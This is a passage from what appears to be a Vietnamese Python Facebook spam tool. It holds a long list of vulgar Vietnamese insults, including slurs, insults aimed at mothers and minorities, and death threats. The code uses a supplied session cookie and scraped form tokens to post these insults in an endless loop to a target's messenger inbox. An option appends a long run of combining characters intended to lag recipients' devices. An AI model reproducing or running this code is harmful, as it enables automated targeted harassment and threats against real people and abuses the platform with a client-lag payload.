f"Cha m chặt cặc ăn🤣🤣👌{name}",
f"Gà đĩ🐔 mà đòi ăn ae tao à 🍔🐶{name}",
f"Súc sinh k trình mà đòi bem anh hả th đú:)))){name}",
f"yếu dữ ta😏😏{name}",
f"Đẻ bằng tinh trùng fake👉🤣{name}",
f"ổn dữ chưa =))) {name}",
f"Cha là chúa thánh🐒🎶 đên đây để bịt mõm mấy tk anh hùng:))) {name}",
f"Mày Sài ngôn tiền sử à vLong DecvLong Deca 🤣🤣  {name}",
f"M cạn ngôn à cn đĩ ngu ngôn tiền sử cmnr🤢🤢  {name}",
f"có thể hăng ko á   {name}",
f"ẻm cay doài =)))  {name}",
f"cay tuột buồi 👉🤣 {name}",
f"Úi Úi thg cay cha tao nên chặt cu kìa 🤣 =))  {name}",
f"Mẹ m cắt cổ chết:3  {name}",
f"CÂM LÀ CẢ NHÀ M CHẾT DƯỚI 💀TAY CHA😣∋⓪①②③( =ノωヽ=)◉‿◉🐮🐮  f",
f"Cha win cmnr❦❦❦❦🤢🤢  {name}",
f"thằng mồ côi khốn khổ 😮‍💨😮‍💨🤣🤣 👌 {name}",
f"lại bá à :)))  {name}",
f"sao chậm dữ  {name}",
f"thằng bê đê ảo cặc đòi cân và cái kết:))):3  {name}",
f"bem với cha phải banh đầu óc chó ra đáp lại nghe chưa🤨  {name}",
f"sao ức chế dạ 😏😏  {name}",
f"con não cún bị chửi kìa 🤣🤣🐶  {name}",
f"mau đê :))  {name}",
f"hăng đê :)))  {name}",
f"sủa mau đê =))  {name}",
f"cần cứu ko :))  {name}",
f"cố đi :3  {name}",
f"Mày chơi lại tao không mà đú vậy con :)))  {name}",
f"sủa to lên🤣🤣  {name}",
f"đáp ngôn nhanh hơn tý đc k tk ngu xuẩn🌬 🤢🤢  {name}",
f"óc cặc tỉnh lẽ =))))  {name}",
f"KHÔNG AI CÓ THỂ BẰNG CHA OKBINGSUL 〖〗➢➣↯↥↦⁂✭ 🤣🤣  {name}",
f"kkk  {name}",
f"DÂN TỘC MIỀN NÚI🤣🐶👌  {name}",
f"CẤM NGƯNG NHA 🤣🤣  {name}",
f"NGU HẢ :)))  {name}",
f"SAO ĐÓ:))  {name}",
f"câm là cha win đó nha culi :)))  {name}",
f"eo oyyy:3  {name}",
f"cố đê 🤣🤣  {name}",
f"thấy mày đơ đơ :)))  {name}",
f" sủa 🤣🤣  {name}",
f"điên :)))  {name}",
f"dại))  {name}",
f"đê🤣🤘  {name}",
f"Cha m đụ heo sinh ra mày đk dog   {name}",
f"mệt đk  {name}",
f"cấm m ngưng  {name}",
f"đĩ đầu đinh :)))  {name}",
f"lẹ đê:))  {name}",
f"mày lag à :))  {name}",
f"lòi lồn chiến sĩ rồi à:)))  {name}",
f"tâm lí ko vững à :))  {name}",
f"cần thuốc à :))  {name}",
f"hấp hối hả🤣🤣  {name}",
f"khó thở dk :))  {name}",
f"cần oxi ko :)))  {name}",
f"cha vnhan tới là m die :)))  {name}",
f"tuột hứng cha :)))  {name}",
f"t thấy m gà rõ 🫵🤣 :)))  {name}",
f"sao chậm chạp v :))  {name}",
f"óc dái 🤣🤣  {name}",
f"lồn cụ con đĩ đớ🤣🤣  {name}",
f"lưu loát lên đê 🤣🤣  {name}",
f"khựng dạ :)))  {name}",
f"t mạnh lắm phải ko à :)))  {name}",
f":))) nhỏ mếu à ae  {name}",
f"m nghèo mà  {name}",
f"sợ t lắm à:3  {name}",
f"Do tao quá bá chứ thiệt ra mày cũng ngu như chó  =)))  {name}",
f"Vào 1 hôm bỗng con đĩ mẹ nhà m die thì lúc đó cha làm bá chủ sàn mẹ r :))  {name}",
f"thương ẻm cố gắng🤢🤘  {name}",
f"Từ Bỏ rồi à?,Mày Còn chối à 🤣🤣  {name}",
f":)) 🤣🤣  {name}",
f"cay lắm à :))  {name}",
f"nhạt nhoè v à  {name}",
f"lại phải win nữa à🙄🙄 f",
f"sủa đê 🤣🤣 {name}",
f"chó bú cứt🤣🤣👌{name}",
f"hăng hái đê :)) {name}",
f"chậm dọ 🤣🤣 {name}",
f"óc dái cay r🤣🤣 {name}",
f"ăn hại phát biểu lẹ đê 🤣🤣 {name}",
f"óc dái :))) {name}",
f"ổn phải k? {name}",
f"ngu ớn 🤣🤣👌 {name}",
f"chó ăn cứt 🐶 {name}",
f"dái đú :)))) {name}",
f"yếu dữ ta😏😏 {name}",
f"con chó đần👉🤣 {name}",
f"ổn dữ chưa =))) {name}",
f"run ớn dạ :))) {name}",
f"óc đú 🤣🤣 {name}",
f"rồi xong 🤢🤢 {name}",
f"có thể hăng ko á  {name}",
f"ẻm cay doài =))) {name}",
f"cay tuột buồi 👉🤣{name}",
f"ei ei =)) {name}",
f"em ei :3 {name}",
f"chạy à {name}",
f"mày sợ hả 🤢🤢 {name}",
f"coi ẻm sồn kìa🤣🤣 👌{name}",
f"lại bá à :))) {name}",
f"sao chậm dữ {name}",
f"eo oyyy:3 {name}",
f"hú hú🤨 {name}",
f"sao ức chế dạ 😏😏 {name}",
f"con não cún bị chửi kìa 🤣🤣🐶 {name}",
f"mau đê :)) {name}",
f"hăng đê :))) {name}",
f"sủa mau đê =)) {name}",
f"cần cứu ko :)) {name}",
f"cố đi :3 {name}",
f"gáng lên đê :))) {name}",
f"sủa to lên🤣🤣 {name}",
f"phò nông thôn 🤢🤢 {name}",
f"óc cặc tỉnh lẽ =)))) {name}",
f"khoẻ ko 🤣🤣 {name}",
f"kkk {name}",
f"đói à🤣🐶👌 {name}",
f"ăn chưa à 🤣🤣 {name}",
f"chưa đk :))) {name}",
f"thấy kém cõi :)) {name}",
f"đú cứt kìa :))) {name}",
f"eo oyyy:3 {name}",
f"cố đê 🤣🤣 {name}",
f"thấy mày đơ đơ :))) {name}",
f"con cave 🤣🤣 {name}",
f"mạnh lên:))) {name}",
f"gõ mạnh lên đê:)) {name}",
f"thấy ngại ngùng z🤣🤘 {name}",
f"tự nhiên đê {name}",
f"mệt đk {name}",
f"cấm m ngưng {name}",
f"đĩ đầu đinh :))) {name}",
f"lẹ đê:)) {name}",
f"mày lag à :)) {name}",
f"m trầm cảm à :))) {name}",
f"tâm lí ko vững à :)) {name}",
f"cần thuốc à :)) {name}",
f"hấp hối hả🤣🤣 {name}",
f"khó thở dk :)) {name}",
f"cần oxi ko :))) {name}",
f"mày bệnh nặng lắm à :))) {name}",
f"tuột hứng cha :))) {name}",
f"tnh gà :))) {name}",
f"sao chậm chạp v :)) {name}",
f"óc dái 🤣🤣 {name}",
f"lồn cụ con đĩ đớ🤣🤣 {name}",
f"lưu loát lên đê 🤣🤣 {name}",
f"khựng dạ :))) {name}",
f"t mạnh lắm phải ko à :))) {name}",
f":))) nhỏ mếu à ae {name}",
f"m nghèo mà {name}",
f"sợ t lắm à:3 {name}",
f"hả cu =))) {name}",
f"thấy tội quá:)) {name}",
f"thương ẻm cố gắng🤢🤘 {name}",
f"mà ngu🤣🤣 {name}",
f":)) 🤣🤣 {name}",
f"cay lắm à :)) {name}",
f"nhạt nhoè v à {name}",
f"ko cảm hứng để hăng à :))) {name}",
f"xạo lồn à :))) {name}",
f"khóc đk :))) {name}",
f"cave tỉnh lẽ phát biểu:)) {name}",
f"ra tín hiệu đê :))) {name}",
f"SOS con dái đú 🤣🤣🤢 {name}",
f"ớ ớ ớ :))) {name}",
f"chó ăn cứt :))) {name}",
f"chó đú sàn 👌🐶 {name}",
f"ỉa ra máu r à :))) {name}",
f"nghèo k có nghi lực à:)) {name}",
f"phản kháng đê :))) t win à {name}",
f"kkk {name}",
f"m chết r à :))) {name}",
f"m nghèo mà em 😏🤣 {name}",
f"m thèm cứt t mà:)) {name}",
f"đĩ mẹ m ngu mà👉🤣 {name}",
f"m cay tao mà :)) {name}",
f"con óc cứt thối🤢🤢 {name}",
f"con đĩ mặt chim🤪🤪 {name}",
f"ôm hận à 🤨 {name}",
f"con đĩ nhà núi :))) {name}",
f"bede bóng lộ =)) {name}",
f"cn đĩ mẹ mày {name}",
f"tao từ hình mẹ m mà :)) {name}",
f"tk phế vật ăn hại😏🤘 {name}",
f"đú đởn hả con :)) {name}",
f"m sao dọ {name}",
f"sủa nè  {name}",
f"123 sủa😏 {name}",
f"lẹ nè  {name}",
f"alo alo hú hú  {name}",
f"th cầm thú {name}",
f"m s dạ  {name}",
f"m sợ mẹ hả  {name}",
f"lên đi mẹ ko giết cha má m đâu mà 😏 {name}",
f"hù :)) {name}",
f"bất ổn hở {name}",
f"s đó  {name}",
f"m rớt kìa th gà🤪 {name}",
f"t cấm m chối nhen {name}",
f"chối t giết cha má m nè:))) {name}",
f"hăng xíu lẹ vLong DecvLong Dec🤢 {name}",
f"th đần  {name}",
f"lên mẹ biểu {name}",
f"k lên t tuyệt chủng m nhen cn thú {name}",
f"m thích đú ko dạ🤨 {name}",
f"ko rep = t win nhen  {name}",
f"cấm chạy nhen {name}",
f"m mau  {name}",
f"lên đây ơ ơ  {name}",
f"th ngu ê {name}",
f"s á lên đây mẹ sút m chết {name}",
f"m khóc à 👉🤣 {name}",
f"sủa liên tục ơ🤣🤣 {name}",
f"cầu cứu lũ đú à  {name}",
f"sục dái nó xem à {name}",
f"dái thâm v? {name}",
f"chậm v cn culi🤣🤣👌 {name}",
f"hoảng loạn à {name}",
f"bất ổn à 🤮🤮 {name}",
f"run à {name}",
f"chạy à  {name}",
f"đuối à  {name}",
f"bại chưa 👉😏 {name}",
f"sủa mau🙄🙄👈 {name}",
f"mạnh dạn lên  {name}",
f"nhanh t cho cơ hội cứu má m nè {name}",
f"cấm mách mẹ {name}",
f"ảo war hở :)) {name}",
f"dồn ko  {name}",
f"đua nè lên sàn t chấp😏👌 {name}",
f"th chợ búa m sao v {name}",
f"th đầu buồi mặt chó😢🫵🏻👈🏻 {name}",
f"cấm hoảng loạn {name}",
f"lại phải win nữa à🙄🙄 {name}",
f"kkk {name}"
]
    nd= random.choice(CAU_CHUI)
    headers = {
      'authority': 'm.facebook.com',
      'accept': '*/*',
      'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
      # Requests sorts cookies= alphabetically
      'cookie': ck,
      'origin': 'https://m.facebook.com',
      'referer': 'https://www.facebook.com',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
     'x-response-format': 'JSONStream',
    }

    params = {
      'icm': '1',
    } 
    delay=int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập delay(khuyến cáo trên 10s) :{vang} '))
    while True:
      for nd in CAU_CHUI:
          datas = {
                    f'ids[{idcanspam}]': idcanspam,
                    'body': nd,
                    'waterfall_source': 'message',
                    'fb_dtsg': fb_dtsg,
                    'jazoest': jazoest,
                  }
          response = requests.post('https://m.facebook.com/messages/send/', params=params, headers=headers, data=datas)
          print(f'{xanh_la}Send Success | {tim}{nd}')
          idelay(delay)

  elif nhap == '2.8':
    clear()
    runbanner(chontool)
    idcanspam=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập id box cần spam :{vang} ')
    while True:
      ck=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập cookie facebook :{vang} ')
      try:
        get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={idcanspam}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': ck,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
        fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
        jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
        clear()
        break
      except:
        print(f'{do}Cookie sai!!')   
    runbanner(chontool)
    params = {
      "icm": '1',
    }
    
    headers = {
      "Host":"mbasic.facebook.com",
      "content-length":"247",
      "content-type":"application/x-www-form-urlencoded",
      "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
      "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "sec-fetch-site":"same-origin",
      "sec-fetch-mode":"navigate",
      "sec-fetch-user":"?1",
      "sec-fetch-dest":"document",
      "accept-encoding":"gzip, deflate, br",
      "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
      "cookie":ck,
    }
    chon_name = str(input(f"{xanhnhat}Bạn có muốn câu chửi có thêm kí tự gây lag không {trang}({vang}y{tim}/{vang}n{trang}) : {vang}"))
    if chon_name.lower() == "y":
      name = "➳➴➵➶➷/꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰